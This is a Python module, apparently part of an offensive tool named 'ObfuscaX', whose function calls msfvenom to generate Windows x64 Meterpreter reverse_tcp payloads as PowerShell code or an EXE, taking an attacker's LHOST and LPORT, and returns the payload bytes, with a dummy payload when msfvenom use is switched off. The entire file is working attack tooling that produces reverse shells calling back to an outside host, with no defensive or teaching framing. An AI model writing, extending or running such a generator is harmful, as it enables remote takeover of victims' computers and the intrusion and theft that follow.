import subprocess
import logging

logger = logging.getLogger("ObfuscaX")

def generate_payload(payload_type, lhost, lport, use_msf=False):
    """
    Generate payload using msfvenom or return a dummy payload.
    payload_type: "ps1" or "exe"
    """
    if not use_msf:
        logger.warning("msfvenom usage not enabled, returning dummy payload.")
        if payload_type == "ps1":
            return b"Write-Host 'Dummy PowerShell Payload'"
        elif payload_type == "exe":
            return b"Dummy EXE Payload"
        else:
            raise ValueError("Unsupported payload type")
    
    if payload_type == "ps1":
        logger.info("Generating PowerShell payload using msfvenom...")
        cmd = [
            "msfvenom",
            "-p", f"windows/x64/meterpreter/reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "powershell"
        ]
    elif payload_type == "exe":
        logger.info("Generating EXE payload using msfvenom...")
        cmd = [
            "msfvenom",
            "-p", f"windows/x64/meterpreter/reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "exe",
            "-o", "payload.exe"
        ]
    else:
        raise ValueError("Unsupported payload type")

    try:
        if payload_type == "exe":
            subprocess.run(cmd, check=True)
            with open("payload.exe", "rb") as f:
                payload_data = f.read()
            return payload_data
        else:
            result = subprocess.run(cmd, capture_output=True, check=True)
            return result.stdout
    except Exception as e:
        logger.error(f"msfvenom payload generation failed: {e}")
        raise
